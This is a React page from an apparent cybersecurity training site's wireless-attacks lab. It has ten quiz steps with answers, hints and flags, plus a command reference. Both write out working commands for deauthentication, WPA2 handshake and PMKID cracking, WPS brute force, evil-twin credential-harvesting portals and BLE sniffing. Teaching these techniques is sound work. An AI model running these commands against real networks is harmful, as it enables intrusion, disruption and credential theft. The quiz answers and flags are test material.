'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#aaff00'
const moduleId = 'wireless-attacks'
const moduleName = 'Wireless Attacks'
const moduleNum = '12'
const xpTotal = 250

const steps: LabStep[] = [
  {
    id: 'wireless-01',
    title: 'Monitor Mode',
    objective: 'To capture wireless packets you need monitor mode. What aircrack-ng command puts a wireless interface into monitor mode?',
    hint: 'The tool is "airmon-ng" followed by "start" and the interface name.',
    answers: ['airmon-ng start wlan0', 'airmon-ng start', 'airmon-ng'],
    xp: 20,
    explanation: 'airmon-ng start wlan0 creates a monitor-mode interface (usually wlan0mon). Kill interfering processes first: airmon-ng check kill. Monitor mode lets you capture all 802.11 frames, not just those addressed to your MAC.'
  },
  {
    id: 'wireless-02',
    title: 'WPA2 Handshake Capture',
    objective: 'Capture a WPA2 4-way handshake for offline cracking. What airodump-ng flag filters capture to a specific BSSID?',
    hint: 'The flag is --bssid followed by the access point MAC address.',
    answers: ['--bssid', 'airodump-ng --bssid', '--bssid <mac>'],
    xp: 25,
    explanation: 'airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon captures only traffic for the target AP on channel 6. A handshake appears when a client connects or re-authenticates. Force one with: aireplay-ng --deauth 5 -a BSSID wlan0mon.'
  },
  {
    id: 'wireless-03',
    title: 'Hashcat WPA Cracking',
    objective: 'Crack a captured WPA2 handshake with hashcat. What hashcat mode cracks WPA/WPA2 PMKID and handshakes?',
    hint: 'The mode number is 22000 for the modern hcwpax format, or 2500 for older .cap format.',
    answers: ['22000', '-m 22000', '2500', '-m 2500'],
    flag: 'FLAG{wpa2_cracked}',
    xp: 30,
    explanation: 'Convert: hcxpcapngtool capture.cap -o hash.hcwpax, then: hashcat -m 22000 hash.hcwpax wordlist.txt. Add rules: -r /usr/share/hashcat/rules/best64.rule. GPU cracking speed: RTX 4090 = ~3.5 million WPA2 hashes/second, making weak passwords (<10 chars) crackable quickly.'
  },
  {
    id: 'wireless-04',
    title: 'Evil Twin Attack',
    objective: 'An evil twin AP mimics a legitimate network to capture credentials. What tool creates a fake AP and captive portal?',
    hint: 'Tools include hostapd-wpe for WPA-Enterprise, or airbase-ng, or the modern "wifiphisher".',
    answers: ['wifiphisher', 'hostapd-wpe', 'airbase-ng', 'hostapd'],
    xp: 25,
    explanation: 'wifiphisher -e "TargetSSID" -aI wlan0mon -kI wlan1 automates: deauth clients from real AP, broadcast identical SSID, serve a captive portal that harvests credentials or delivers payloads. Success depends on signal strength — stay closer to victim than the real AP.'
  },
  {
    id: 'wireless-05',
    title: 'Bluetooth Reconnaissance',
    objective: 'Scan for nearby Bluetooth devices in discovery mode. What Linux command-line tool scans for Bluetooth devices?',
    hint: 'The tool is "hcitool" — part of the bluez package. Command: hcitool scan',
    answers: ['hcitool scan', 'hcitool', 'btscanner', 'bluetooth scan', 'bluetoothctl'],
    flag: 'FLAG{wireless_recon_complete}',
    xp: 35,
    explanation: 'hcitool scan discovers discoverable Bluetooth Classic devices. For BLE: hcitool lescan. bluetoothctl is the modern interactive alternative. Ubertooth-one can capture BLE advertising packets from non-discoverable devices. Found MACs feed into bluejacking or MITM attacks.'
  },
  {
    id: 'wireless-06',
    title: 'WPS PIN Attack',
    objective: 'WPS (Wi-Fi Protected Setup) has a design flaw that allows brute-forcing the 8-digit PIN in only around 11,000 attempts. What tool exploits this WPS vulnerability?',
    hint: 'Two tools are valid: one starts with "r" and one starts with "b". A faster variant uses a Pixie Dust attack.',
    answers: ['reaver', 'bully', 'reaver -i wlan0mon -b BSSID', 'pixie dust'],
    xp: 25,
    explanation: 'reaver -i wlan0mon -b BSSID -vv brute-forces the WPS PIN. The PIN is verified as two halves (4+4 digits), reducing combinations from 100 million to 11,000. Pixie Dust attack (reaver -K 1) is faster and exploits weak random number generation in some router chipsets to recover the PIN in seconds. wash -i wlan0mon identifies WPS-enabled APs in range. Many modern routers implement WPS lockout after repeated failures, slowing brute-force attempts significantly.'
  },
  {
    id: 'wireless-07',
    title: 'PMKID Attack',
    objective: 'The PMKID attack captures WPA2 material without needing a 4-way handshake - just a single frame from the AP is enough. What tool captures PMKIDs directly from an access point?',
    hint: 'The tool name starts with "hcx" - part of the hcxtools suite.',
    answers: ['hcxdumptool', 'hcxtools', 'hcxdumptool -i wlan0mon -o pmkid.pcapng'],
    flag: 'FLAG{pmkid_captured}',
    xp: 25,
    explanation: 'hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1 captures PMKIDs without needing connected clients. Convert with: hcxpcapngtool pmkid.pcapng -o hash.hcwpax. Crack with hashcat -m 22000. The PMKID is computed as HMAC-SHA1(PMK, "PMK Name" + AP_MAC + Client_MAC) - if you know the passphrase you can derive and verify the PMK independently. The key advantage over handshake capture: this works even when no clients are currently associated with the target AP.'
  },
  {
    id: 'wireless-08',
    title: 'Captive Portal Credential Harvesting',
    objective: 'A captive portal attack presents a fake Wi-Fi login page to harvest credentials from victims. What component serves the fake HTML login page in a wifiphisher attack?',
    hint: 'Think about what software actually delivers the web page content to the victim browser.',
    answers: ['web server', 'apache', 'nginx', 'lighttpd', 'phishing page', 'captive portal page'],
    xp: 20,
    explanation: 'wifiphisher uses a built-in web server with phishing scenario templates. When a victim connects to the evil twin AP, DNS is hijacked so all domain queries return the attacker IP. HTTP requests then hit the fake portal page. Scenarios include a router firmware update page, OAuth login prompt, or ISP authentication portal. Submitted credentials are captured and logged to a file. Countermeasures include HTTPS-only portals and certificate pinning in apps, though browser-based portals are still vulnerable.'
  },
  {
    id: 'wireless-09',
    title: 'Deauthentication Attack',
    objective: '802.11 management frames are unencrypted and unauthenticated, allowing an attacker to spoof deauth frames and disconnect clients. What aireplay-ng attack type number sends deauthentication frames?',
    hint: 'It is a single digit. The flag used is -0 (zero), not the letter O.',
    answers: ['0', '--deauth 0', 'aireplay-ng --deauth', '-0', 'attack 0'],
    xp: 20,
    explanation: 'aireplay-ng -0 10 -a BSSID -c CLIENT_MAC wlan0mon sends 10 deauth frames targeting a specific client. Omitting -c broadcasts to all clients on that AP. Unencrypted management frames in older 802.11 standards allow this spoofing because no authentication is required. 802.11w (Protected Management Frames), enabled by default in WPA3, mitigates deauth attacks by encrypting and authenticating management frames. Common uses: force a WPA2 handshake capture, disrupt a target user, or push clients onto an evil twin AP.'
  },
  {
    id: 'wireless-10',
    title: 'BLE Sniffing',
    objective: 'BLE devices broadcast advertising packets that can be passively captured without pairing. What Ubertooth-based command captures BLE advertising packets on the primary advertising channel?',
    hint: 'The command starts with "ubertooth-btle" followed by flags to enable following and specify the advertising channel.',
    answers: ['ubertooth-btle', 'ubertooth', 'ubertooth-one', 'ubertooth-btle -f -A 37'],
    flag: 'FLAG{wireless_complete}',
    xp: 30,
    explanation: 'ubertooth-btle -f -A 37 sniffs BLE advertising on channel 37. BLE uses 3 dedicated advertising channels (37, 38, 39). Pipe to Wireshark for live analysis: ubertooth-btle -f -c /tmp/pipe in the background, then wireshark -k -i /tmp/pipe. BLE vulnerabilities include unencrypted characteristics, predictable pairing PINs, and GATT attribute enumeration. gatttool -b DEVICE_MAC --primary lists GATT services on a target device. The nRF Sniffer dongle is a lower-cost alternative hardware option for BLE capture.'
  }
]

export default function WirelessAttacksLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    const saved = localStorage.getItem('lab_wireless-attacks-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#4a6a00' }}>
        <Link href="/" style={{ color: '#4a6a00', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/wireless-attacks" style={{ color: '#4a6a00', textDecoration: 'none' }}>WIRELESS ATTACKS</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/wireless-attacks" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #2a3a00', borderRadius: '3px', color: '#4a6a00', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(170,255,0,0.1)', border: '1px solid rgba(170,255,0,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(170,255,0,0.04)', border: '1px solid rgba(170,255,0,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#2a3a00', border: p.active ? '2px solid ' + accent : '1px solid #2a3a00', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#3a5a00', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#2a3a00', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a7a40' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(170,255,0,0.1)', border: '1px solid rgba(170,255,0,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#3a5a00', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Wireless Attacks Lab</h1>
          </div>
        </div>

        <p style={{ color: '#6a7a4a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          Monitor mode, WPA2 handshake capture, hashcat cracking, evil twin attacks, and Bluetooth recon.
          Type real commands, earn XP, and capture flags. Complete all 10 steps to unlock Phase 2.
        </p>

        <div style={{ background: 'rgba(170,255,0,0.03)', border: '1px solid rgba(170,255,0,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#2a3a00', letterSpacing: '0.25em', marginBottom: '8px' }}>KEY CONCEPTS COVERED IN THIS LAB</div>
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '6px' }}>
            {['Monitor mode', 'WPA2 handshake', 'PMKID attack', 'Hashcat cracking', 'Evil twin AP', 'Deauth attacks', 'Bluetooth scanning', 'WPS vulnerabilities'].map(c => (
              <span key={c} style={{ fontSize: '7.5px', color: '#6a7a40', background: 'rgba(170,255,0,0.06)', border: '1px solid rgba(170,255,0,0.12)', padding: '2px 8px', borderRadius: '3px' }}>{c}</span>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="wireless-attacks-lab"
          moduleId={moduleId}
          title="Wireless Attacks Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(170,255,0,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(170,255,0,0.4)' : '#2a3a00'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#3a5a00', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#6a7a40' : '#3a5a00', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 — FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#3a5a00' }}>Full Wireless Attacks Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#ffb347', background: 'rgba(255,179,71,0.08)', border: '1px solid rgba(255,179,71,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(170,255,0,0.04)' : '#050600', border: '1px solid ' + (guidedDone ? 'rgba(170,255,0,0.25)' : '#151a00'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#6a7a40' : '#2a3a00', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#3a5a00', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', color: '#6a7a40', marginBottom: '0.75rem', lineHeight: 1.7 }}>
              Free-form terminal sandbox for Wireless Attacks
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#3a5a00', marginBottom: '2rem', lineHeight: 1.7 }}>
              Command history &nbsp;·&nbsp; Tab autocomplete &nbsp;·&nbsp; Real command simulation &nbsp;·&nbsp; No restrictions
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['aircrack-ng suite', 'wifiphisher attacks', 'Bluetooth recon', 'WPS cracking', 'PMKID capture', 'Hashcat GPU cracking'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#2a3a00' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#6a7a40' : '#2a3a00' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(170,255,0,0.6)' : '#2a3a00'), borderRadius: '6px', background: guidedDone ? 'rgba(170,255,0,0.12)' : 'transparent', color: guidedDone ? accent : '#2a3a00', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(170,255,0,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#2a3a00' }}>Complete all 10 guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#050600' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#070800', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a5a00' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any wireless attack technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #2a3a00', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#3a5a00', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '▼' : '▶'} QUICK REFERENCE — WIRELESS COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#050600', border: '1px solid #151a00', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: '8px' }}>
              {[
                ['airmon-ng check kill && airmon-ng start wlan0', 'Enable monitor mode cleanly'],
                ['airodump-ng wlan0mon', 'Scan for nearby networks'],
                ['airodump-ng --bssid BSSID -c CHAN -w cap wlan0mon', 'Capture target AP traffic'],
                ['aireplay-ng --deauth 5 -a BSSID wlan0mon', 'Force client reconnection for handshake'],
                ['hcxpcapngtool cap.cap -o hash.hcwpax', 'Convert capture to hashcat format'],
                ['hashcat -m 22000 hash.hcwpax rockyou.txt', 'Crack WPA2 with wordlist'],
                ['wifiphisher -e "TargetSSID" -aI wlan0mon -kI wlan1', 'Evil twin with captive portal'],
                ['hcitool scan', 'Scan for Bluetooth devices'],
                ['hcitool lescan', 'Scan for BLE devices'],
                ['reaver -i wlan0mon -b BSSID -vv', 'WPS brute force attack'],
                ['wash -i wlan0mon', 'Find WPS-enabled APs'],
                ['airbase-ng -e "FreeWifi" -c 6 wlan0mon', 'Create fake open AP'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#030400', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.72rem', flexShrink: 0 }}>{cmd}</code>
                  <span style={{ color: '#6a7a40', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #151a00', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/wireless-attacks" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a5a00' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/mobile-security/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#3a5a00' }}>MOD-13 MOBILE SECURITY LAB &#8594;</Link>
      </div>
    </div>
  )
}
